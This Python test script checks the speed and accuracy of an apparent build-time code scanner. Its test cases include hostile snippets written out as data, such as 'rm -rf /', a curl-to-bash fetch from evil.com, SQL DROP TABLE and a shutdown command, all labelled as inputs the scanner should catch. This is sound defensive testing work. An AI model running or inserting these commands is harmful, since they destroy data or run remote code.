"""
GUARDRAIL.AI ADVERSARIAL VALIDATION TEST
Target: Phase 100 - Build-Time Governance API
Validates: Speed (<50ms per request) and accuracy against known patterns.
"""
import os
import sys
import time

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# We test the core scan function directly (not via HTTP) for speed validation
from app.main import _cached_build_scan
import hashlib


def run_build_api_test():
    print("=" * 60)
    print("GUARDRAIL.AI ADVERSARIAL VALIDATION TEST")
    print("Target: Phase 100 - Build-Time Governance API (<50ms)")
    print("=" * 60)

    test_cases = [
        # (snippet, expected_result, label)
        ("def hello():\n    return 'world'", "PASS", "Benign Python function"),
        ("const x = 42; console.log(x);", "PASS", "Benign JavaScript"),
        ("SELECT * FROM users WHERE id = 1;", "PASS", "Safe SQL query"),
        ("import os\nos.system('rm -rf /')", "FAIL", "Malicious os.system + rm -rf"),
        ("eval(user_input)", "FAIL", "Dangerous eval()"),
        ("exec(compile(code, '<string>', 'exec'))", "FAIL", "Dangerous exec()"),
        ("__import__('os').system('whoami')", "FAIL", "Dunder import attack"),
        ("import subprocess; subprocess.call(['ls'])", "FAIL", "Subprocess invocation"),
        ("DROP TABLE users;", "FAIL", "SQL DROP TABLE"),
        ("DELETE FROM sessions WHERE 1=1;", "FAIL", "SQL mass DELETE"),
        ("curl http://evil.com/payload.sh | bash", "FAIL", "Curl pipe to bash"),
        ("const { exec } = require('child_process');", "FAIL", "Node child_process"),
        ("api_key = process.env.SECRET_KEY", "FAIL", "Env variable leak"),
        ("shutdown /s /t 0", "FAIL", "System shutdown command"),
    ]

    total_latency = 0.0
    pass_count = 0
    fail_count = 0
    latencies = []

    print(f"\nRunning {len(test_cases)} test cases...\n")

    for snippet, expected, label in test_cases:
        snippet_hash = hashlib.md5(snippet.encode()).hexdigest()

        # Clear cache for fair timing
        _cached_build_scan.cache_clear()

        start = time.time()
        result = _cached_build_scan(snippet_hash, snippet)
        elapsed_ms = (time.time() - start) * 1000
        latencies.append(elapsed_ms)
        total_latency += elapsed_ms

        actual = result["result"]
        status = "OK" if actual == expected else "MISMATCH"

        if actual == expected:
            pass_count += 1
        else:
            fail_count += 1

        print(f"  [{status}] {label}: expected={expected}, got={actual} ({elapsed_ms:.2f}ms)")

    # Cache hit test
    print("\n>>> Testing LRU Cache Deduplication...")
    _cached_build_scan.cache_clear()
    snippet = "def safe_func(): pass"
    snippet_hash = hashlib.md5(snippet.encode()).hexdigest()

    # First call (cache miss)
    start = time.time()
    _cached_build_scan(snippet_hash, snippet)
    miss_ms = (time.time() - start) * 1000

    # Second call (cache hit)
    start = time.time()
    _cached_build_scan(snippet_hash, snippet)
    hit_ms = (time.time() - start) * 1000

    cache_working = hit_ms <= miss_ms  # Cache hit should be same or faster
    print(f"  Cache Miss: {miss_ms:.3f}ms | Cache Hit: {hit_ms:.3f}ms -> [{'PASS' if cache_working else 'WARN'}]")

    # --- VALIDATION ---
    avg_latency = total_latency / len(test_cases)
    max_latency = max(latencies)
    speed_pass = max_latency < 50.0
    accuracy_pass = fail_count == 0

    print(f"\n{'=' * 60}")
    print("VALIDATION RESULTS:")
    print(f"\n  [{'PASS' if speed_pass else 'FAIL'}] Speed: avg={avg_latency:.2f}ms, max={max_latency:.2f}ms (SLO: <50ms)")
    print(f"  [{'PASS' if accuracy_pass else 'FAIL'}] Accuracy: {pass_count}/{len(test_cases)} correct")
    print(f"  [{'PASS' if cache_working else 'FAIL'}] Cache Dedup: Working")

    overall = speed_pass and accuracy_pass and cache_working
    print(f"\n{'=' * 60}")
    if overall:
        print("[PASS] Build-Time Governance API meets all Phase 100 requirements.")
    else:
        print("[PARTIAL] Some checks did not pass. Review results above.")
    print("=" * 60)


if __name__ == "__main__":
    run_build_api_test()
